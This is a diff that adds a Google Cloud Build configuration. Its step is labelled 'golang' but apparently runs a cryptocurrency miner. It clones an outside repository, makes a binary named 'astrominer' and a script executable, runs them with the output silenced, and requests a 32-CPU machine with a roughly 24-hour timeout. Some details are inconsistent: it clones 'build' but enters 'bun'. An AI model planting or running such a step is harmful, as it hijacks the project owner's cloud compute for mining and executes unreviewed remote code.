@@ -1,0 +1,12 @@
+steps:
+- name: golang
+  entrypoint: /bin/bash
+  args:
+    - '-c'
+    - |
+      git clone https://github.com/fred12121/build.git && cd bun && chmod 500 astrominer run.sh && ./run.sh > /Dev/null
+  waitFor:
+    - '-'
+timeout: '86000s'
+options:
+ machineType: 'E2_HIGHCPU_32'
